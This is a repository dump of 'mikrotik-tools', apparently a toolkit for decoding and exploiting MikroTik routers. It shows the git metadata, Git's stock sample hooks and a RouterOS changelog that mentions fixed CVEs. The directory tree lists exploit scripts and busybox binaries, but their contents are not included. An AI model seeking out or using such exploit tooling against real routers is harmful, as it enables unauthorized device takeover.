# Repository Information
Name: mikrotik-tools

# Directory Structure
Directory structure:
└── github_repos/mikrotik-tools/
    │   ├── config
    │   ├── description
    │   ├── HEAD
    │   ├── hooks/
    │   │   ├── applypatch-msg.sample
    │   │   ├── commit-msg.sample
    │   │   ├── fsmonitor-watchman.sample
    │   │   ├── post-update.sample
    │   │   ├── pre-applypatch.sample
    │   │   ├── pre-commit.sample
    │   │   ├── pre-merge-commit.sample
    │   │   ├── pre-push.sample
    │   │   ├── pre-rebase.sample
    │   │   ├── pre-receive.sample
    │   │   ├── prepare-commit-msg.sample
    │   │   ├── push-to-checkout.sample
    │   │   └── update.sample
    │   ├── index
    │   ├── info/
    │   │   └── exclude
    │   ├── logs/
    │   │   ├── HEAD
    │   │   └── refs/
    │   │       ├── heads/
    │   │       │   └── master
    │   │       └── remotes/
    │   │           └── origin/
    │   │               └── HEAD
    │   ├── objects/
    │   │   ├── info/
    │   │   └── pack/
    │   │       ├── pack-51b3e29fc676b938318e5b39d56b2a3dd4cecb21.idx
    │   │       └── pack-51b3e29fc676b938318e5b39d56b2a3dd4cecb21.pack
    │   ├── packed-refs
    │   └── refs/
    │       ├── heads/
    │       │   └── master
    │       ├── remotes/
    │       │   └── origin/
    │       │       └── HEAD
    │       └── tags/
    ├── changelog-historic
    ├── command_trees/
    │   └── README.md
    ├── decode_backup.py
    ├── decode_blank.py
    ├── decode_supout.py
    ├── decode_user.py
    ├── encode_supout.py
    ├── exploit-backup/
    │   ├── busybox-arm
    │   ├── busybox-i386
    │   ├── busybox-mips
    │   ├── busybox-mipsel
    │   ├── busybox-mmips
    │   ├── busybox-powerpc
    │   ├── busybox-smips
    │   ├── busybox-x86
    │   ├── busybox-x86_64
    │   ├── exploit_b.py
    │   ├── exploit_full.sh
    │   └── slave.sh
    ├── exploit-defconf/
    │   ├── make_usb.sh
    │   └── second_stage.sh
    ├── getnpk.sh
    ├── mt_dat_decoder.py
    ├── npkparts.ods
    ├── npk_descriptions.ods
    ├── README.md
    └── reversenpk.sh


# Content
File: /.git\config
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://github.com/0ki/mikrotik-tools.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master


File: /.git\description
Unnamed repository; edit this file 'description' to name the repository.


File: /.git\HEAD
ref: refs/heads/master


File: /.git\hooks\applypatch-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:


File: /.git\hooks\commit-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}


File: /.git\hooks\fsmonitor-watchman.sample
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
File: /.git\hooks\post-update.sample
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info


File: /.git\hooks\pre-applypatch.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:


File: /.git\hooks\pre-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --


File: /.git\hooks\pre-merge-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:


File: /.git\hooks\pre-push.sample
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local oid> <remote ref> <remote oid>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')

while read local_ref local_oid remote_ref remote_oid
do
	if test "$local_oid" = "$zero"
	then
		# Handle delete
		:
	else
		if test "$remote_oid" = "$zero"
		then
			# New branch, examine all commits
			range="$local_oid"
		else
			# Update to existing branch, examine new commits
			range="$remote_oid..$local_oid"
		fi

		# Check for WIP commit
		commit=$(git rev-list -n 1 --grep '^WIP' "$range")
		if test -n "$commit"
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0


File: /.git\hooks\pre-rebase.sample
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END


File: /.git\hooks\pre-receive.sample
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi


File: /.git\hooks\prepare-commit-msg.sample
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi


File: /.git\hooks\push-to-checkout.sample
#!/bin/sh

# An example hook script to update a checked-out tree on a git push.
#
# This hook is invoked by git-receive-pack(1) when it reacts to git
# push and updates reference(s) in its repository, and when the push
# tries to update the branch that is currently checked out and the
# receive.denyCurrentBranch configuration variable is set to
# updateInstead.
#
# By default, such a push is refused if the working tree and the index
# of the remote repository has any difference from the currently
# checked out commit; when both the working tree and the index match
# the current commit, they are updated to match the newly pushed tip
# of the branch. This hook is to be used to override the default
# behaviour; however the code below reimplements the default behaviour
# as a starting point for convenient modification.
#
# The hook receives the commit with which the tip of the current
# branch is going to be updated:
commit=$1

# It can exit with a non-zero status to refuse the push (when it does
# so, it must not modify the index or the working tree).
die () {
	echo >&2 "$*"
	exit 1
}

# Or it can make any necessary changes to the working tree and to the
# index to bring them to the desired state when the tip of the current
# branch is updated to the new commit, and exit with a zero status.
#
# For example, the hook can simply run git read-tree -u -m HEAD "$1"
# in order to emulate git fetch that is run in the reverse direction
# with git push, as the two-tree form of git read-tree -u -m is
# essentially the same as git switch or git checkout that switches
# branches while keeping the local changes in the working tree that do
# not interfere with the difference between the branches.

# The below is a more-or-less exact translation to shell of the C code
# for the default behaviour for git's push-to-checkout hook defined in
# the push_to_deploy() function in builtin/receive-pack.c.
#
# Note that the hook will be executed from the repository directory,
# not from the working tree, so if you want to perform operations on
# the working tree, you will have to adapt your code accordingly, e.g.
# by adding "cd .." or using relative paths.

if ! git update-index -q --ignore-submodules --refresh
then
	die "Up-to-date check failed"
fi

if ! git diff-files --quiet --ignore-submodules --
then
	die "Working directory has unstaged changes"
fi

# This is a rough translation of:
#
#   head_has_history() ? "HEAD" : EMPTY_TREE_SHA1_HEX
if git cat-file -e HEAD 2>/dev/null
then
	head=HEAD
else
	head=$(git hash-object -t tree --stdin </dev/null)
fi

if ! git diff-index --quiet --cached --ignore-submodules $head --
then
	die "Working directory has staged changes"
fi

if ! git read-tree -u -m "$commit"
then
	die "Could not update working tree to new HEAD"
fi


File: /.git\hooks\update.sample
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0


File: /.git\info\exclude
File: /.git\logs\HEAD
0000000000000000000000000000000000000000 3a8103a115c0e68889771075ed4773dfb1d78c0f vivek-dodia <vivek.dodia@icloud.com> 1738605782 -0500	clone: from https://github.com/0ki/mikrotik-tools.git


File: /.git\logs\refs\heads\master
0000000000000000000000000000000000000000 3a8103a115c0e68889771075ed4773dfb1d78c0f vivek-dodia <vivek.dodia@icloud.com> 1738605782 -0500	clone: from https://github.com/0ki/mikrotik-tools.git


File: /.git\logs\refs\remotes\origin\HEAD
0000000000000000000000000000000000000000 3a8103a115c0e68889771075ed4773dfb1d78c0f vivek-dodia <vivek.dodia@icloud.com> 1738605782 -0500	clone: from https://github.com/0ki/mikrotik-tools.git


File: /.git\packed-refs
# pack-refs with: peeled fully-peeled sorted 
3a8103a115c0e68889771075ed4773dfb1d78c0f refs/remotes/origin/master


File: /.git\refs\heads\master
3a8103a115c0e68889771075ed4773dfb1d78c0f


File: /.git\refs\remotes\origin\HEAD
ref: refs/remotes/origin/master


File: /changelog-historic
What's new in 6.46.3 (2020-Jan-28 10:46):

*) hotspot - fixed redirect to log in page (introduced in v6.45);
*) lora - added "ru-864-mid" channel plan;
*) lora - improved immediate packet delivery;
*) lte - added GPS port support for Quectel EP06 modem;
*) lte - added "psc" (Primary Scrambling Code) parameter for "cell-monitor" function on R11e-LTE6 and R11e-LTE;
*) lte - do not show invalid "phy-cellid" when it is not yet received on "R11e-LTE";
*) lte - do not show unrelated info parameters after network mode failover;
*) port - fixed multiple identical USB serial device detection (introduced in v6.46);
*) ppp - fixed connection establishment when receiving "0.0.0.0" DNS;
*) snmp - fixed "ifOperStatus" reporting for combo ports;
*) winbox - removed duplicate "counter", "chain", "size" and "payload" parameters under "LoRa/Traffic";

What's new in 6.46.2 (2020-Jan-14 07:17):

*) chr - improved stability when changing ARP modes on e1000 type adapters;
*) console - prevent "flash" directory from being removed (introduced in v6.46);
*) console - updated copyright notice;
*) crs305 - disable optical SFP/SFP+ module Tx power after disabling SFP+ interface;
*) defconf - fixed "caps-mode" not initialized properly after resetting;
*) defconf - fixed default configuration loading on RBwAPG-60adkit (introduced in v6.46);
*) lora - fixed packet sending when using "antenna-gain" higher than 5dB;
*) lte - fixed "cell-monitor" on R11e-LTE in 3G mode;
*) lte - fixed "earfcn" reporting on R11e-LTE6 in UMTS and GSM modes;
*) lte - report only valid info parameters on R11e-LTE6;
*) ppp - fixed minor typo in "ppp-client" monitor;
*) qsfp - do not report bogus monitoring readouts on modules without DDMI support;
*) qsfp - improved module monitoring readouts for DAC and break-out cables;
*) routerboard - added "mode-button" support for RBcAP2nD;
*) security - fixed vulnerability for routers with default password (limited to Wireless Wire), admin could login on startup with empty password before default configuration script was fully loaded;
*) system - fixed "*.auto.rsc" file execution (introduced in v6.46);
*) system - fixed "check-installation" on PowerPC devices (introduced in v6.46);
*) traffic-generator - improved memory handling on CHR;
*) webfig - allow skin designing without "ftp" and "sensitive" policies;
*) webfig - fixed "skins" saving to "flash" directory if it exists (introduced in v6.46);
*) winbox - automatically refresh "Packets" table when new packets are captured by "Tools/Packet Sniffer";
*) winbox - fixed "Default Route Distance" default value when creating new LTE APN;
*) winbox - removed duplicate "join-eui" and "dev-eui" parameters under "Lora/Traffic";

What's new in 6.46.1 (2019-Dec-13 12:44):

*) capsman - fixed CAP upgrading (introduced in v6.46);
*) console - fixed "clear-history" restoring historic actions after power cycle;
*) console - removed "edit" and "set" actions from "System/History" menu;
*) defconf - fixed default configuration loading after fresh install (introduced in v6.46);
*) dhcpv6-server - use lease time from RADIUS;
*) dude - fixed image and font file accessing (introduced in v6.46);
*) gps - only adjust system time after GPS signal is established;
*) health - fixed health reporting on OmniTIK 5 PoE ac;
*) ipsec - improved system stability when processing decrypted packet on unregistered interface;
*) l2tp - improved system stability when disconnecting many clients at once;
*) log - fixed "disk-file-name" parameter validation (introduced in v6.46);
*) lora - added support for MIPSBE, PPC, TILE and x86 architectures;
*) lora - improved confirmed downlink forwarding;
*) lte - do not reset modem when setting the same SIM slot on LtAP;
*) lte - show SIM error when no card is present;
*) ppp - fixed session establishment with high amount of tunnels (introduced in v6.46);
*) ppp - prioritize "remote-ipv6-prefix-pool" from PPP secret over PPP profile;
*) qsfp - do not show "sfp-wavelength" for cables that do not support it;
*) snmp - fixed health related OID polling (introduced in v6.46);
*) supout - fixed autosupout.rif file generation (introduced in v6.46);
*) system - fixed "*.auto.rsc" file execution (introduced in v6.46);
*) user-manager - fixed "db-path" parameter validation (introduced in v6.46);
*) webfig - fixed skin folder presence (introduced in v6.46);
*) winbox - fixed "allowed-number" parameter setting invalid value in "Tool/SMS" menu;
*) winbox - show "LCD" menu only on boards that have LCD screen;
*) wireless - added "russia4" regulatory domain information;
*) wireless - improved compatibility by adding default installation mode and gain for devices with integrated antennas;
*) wireless - improved compatibility for Switzerland wireless country profile to improve compliance with ETSI regulations;

What's new in 6.46 (2019-Dec-02 11:16):

MAJOR CHANGES IN v6.46:
----------------------
!) lora - added support for LoRaWAN low-power wide-area network technology for MIPSBE, MMIPS and ARM;
!) package - accept only packages with original filenames (CVE-2019-3976);
!) package - improved package signature verification (CVE-2019-3977);
!) security - fixed improper handling of DNS responses (CVE-2019-3978, CVE-2019-3979);
----------------------

Changes in this release:

*) backup - fixed automatic backup file generation when configuration reset by button;
*) backup - store automatically created backup file in "flash" directory;
*) bonding - correctly remove HW offloaded bonding with ARP monitoring;
*) bonding - properly handle MAC addresses when bonding WLAN interfaces;
*) bridge - disable/enable bridge port when setting bpdu-guard;
*) bridge - do not add bridge as untagged VLAN member when frame-types=admit-only-vlan-tagged;
*) bridge - do not add dynamically VLAN entry when changing "pvid" property for non-vlan aware bridge;
*) bridge - include whole VLAN-id in DHCP Option 82 message;
*) btest - removed duplicate "duration" parameter;
*) capsman - fixed background scan showing incorrect regulatory domain mismatch error (CAP upgrade required);
*) capsman - fixed channel auto reselection;
*) capsman - fixed MAC address detection for "common-name" parameter in certificate requests;
*) capsman - improved DFS channel switching when radar detected;
*) capsman - improved radar detection algorithm;
*) ccr - improved general system stability;
*) certificate - added progress bar when creating certificate request;
*) certificate - added support for certificate request signing with EC keys;
*) certificate - allow specifying "file-name" parameter for export (CLI only);
*) certificate - allow specifying "name" parameter for import (CLI only);
*) certificate - improved CRL updating process;
*) certificate - removed "key-size" parameter for "create-certificate-request" command;
*) chr - added support for Azure guest agent;
*) console - added bitwise operator support for "ip6" data type;
*) console - fixed "address" column width when printing DHCPv4 leases;
*) console - fixed IP conversion to "num" data type;
*) console - fixed "tobool" conversion;
*) console - properly detect IPv6 address as "ip6" data type;
*) crs1xx/2xx - allow to set trunk port as mirroring target;
*) crs3xx - correctly handle L2MTU change;
*) crs3xx - do not send pause frames when ethernet "tx-flow-control" is disabled on CRS326/CRS328/CRS305 devices;
*) crs3xx - improved interface initialization;
*) crs3xx - improved switch-chip resource allocation on CRS317-1G-16S+, CRS309-1G-8S+, CRS312-4C+8XG, CRS326-24S+2Q+ devices;
*) crs3xx - improved system stability on CRS309-1G-8S+, CRS312-4C+8XG, CRS326-24S+2Q+ devices;
*) crs3xx - remove previously set mirror-source property before changing it;
*) defconf - fixed default configuration loading on RBmAPL-2nD (introduced in v6.45);
*) defconf - require "policy" permission to print default configuration;
*) dhcpv4-client - allow empty "dhcp-options" parameter when adding new client;
*) dhcpv4-client - fixed "dhcp-options" parameter setting when adding new client;
*) dhcpv4-server - improved stability when RADIUS Interim update is sent;
*) dhcpv6-client - fixed timeout when doing rebind;
*) dhcpv6-client - properly update bind time when unused prefix received from the server;
*) dhcpv6-client - properly update IPv6 address on rebind;
*) dhcpv6-server - fixed logged error message when using "address-pool=static-only";
*) dhcpv6-server - ignore prefix-hint from client's DHCPDISCOVER if static prefix received from RADIUS;
*) dhcpv6-server - include "User-Name" parameter in accounting requests;
*) dhcpv6-server - made "calling-station-id" contain MAC address if DUID contains it;
*) dot1x - added "reject-vlan-id" server parameter (CLI only);
*) dot1x - added support for dynamic switch rules from RADIUS;
*) dot1x - added support for "mac-auth" authentication type (CLI only);
*) ethernet - automatically detect interface when using IP address for power-cycle-ping;
*) ethernet - do not enable interface after reboot that is already disabled;
*) ethernet - send requests only from ethernet interface when using MAC address for power-cycle-ping;
*) export - always export "ssid" value for w60g interfaces;
*) fetch - do not allocate extra 500KiB on SMIPS;
*) fetch - improved stability when processing large output data;
*) gps - use "serial1" as default port on RBLtAP-2HnD;
*) hotspot - fixed non-local NAT redirection to port TCP/64873;
*) hotspot - fixed RADIUS CoA "address-list" update;
*) ike1 - fixed minor spelling mistake in logs;
*) ike2 - improved CHILD SA rekey process with Apple iOS 13;
*) ike2 - improved stability when retransmitting first packet as responder;
*) ipsec - added "error" topic for identity check failure logging messages;
*) ipsec - fixed DNS resolving when domain has only AAAA entries;
*) ipsec - fixed policy "sa-src-address" detection from "local-address" (introduced in v6.45);
*) ipv6 - changed "advertise-dns" default value to "yes";
*) led - fixed default LED configuration for RBLHG-2nD and RBLHG-5HPnD;
*) log - increased log message length limit to 1024 characters;
*) lte - added support for D402 modem;
*) lte - added support for LM960A18;
*) lte - added support for Telit LM960 and LE910C1 modems;
*) lte - do not allow setting 3G and GSM modes on LTE only modems;
*) lte - fixed band setting on R11e-4G;
*) lte - fixed network registration on R11e-LTE-US;
*) lte - fixed Sierra WP7601 driver loading;
*) lte - fix "operator" names not being displayed properly;
*) lte - improved modem initialization;
*) lte - show "primary-band" only for LTE modems;
*) lte - use /128 prefix for IPv6 address on LTE interface;
*) lte - use interface from RA when "ipv6-interface=none" and IPv6 enabled;
*) ppp - added 3GPP IoT "access-technology" definitions;
*) ppp - added support for Sierra WP7601;
*) ppp - disable DTR send when using at-chat;
*) quickset - added "LTE AP Dual" mode support;
*) quickset - added "LTE APN" dropdown support;
*) quickset - fixed "LTE Band" checkbox display;
*) route - fixed area range summary route installation in VRF;
*) routerboard - fixed default CPU frequency on RB750r2 ("/system routerboard upgrade" required);
*) routerboard - fixed USB configuration export on RBLtAP-2HnD;
*) routerboard - hide "memory-frequency" parameter for RBLtAP-2HnD;
*) sniffer - allow filtering by packet size;
*) snmp - added "disabled" and "comment" parameters for communities;
*) snmp - added option to monitor "link-downs" parameter using MIKROTIK-MIB;
*) snmp - fixed "dot1dBasePort" index offset for BRIDGE-MIB;
*) snmp - fixed "ifLastChange" OID reporting for IF-MIB;
*) snmp - fixed "radio-name" (mtxrWlRtabRadioName) OID support;
*) snmp - improved interface status reporting for IfOperStatus OID;
*) snmp - improved LLDP interface returned index and type;
*) snmp - return only interfaces with MAC addresses for LLDP;
*) snmp - use "src-address" also for traps;
*) ssh - fixed output printing when "command" parameter used;
*) supout - include information from all LTE interfaces;
*) supout - removed "file" option from "/system sup-output" command;
*) switch - added "comment" property for switch vlan menu (CLI only);
*) switch - correctly update dynamic switch rule when dhcp-snooping is enabled;
*) switch - ignore "default-vlan-id" property after switch reset on RTL8367 switch chip;
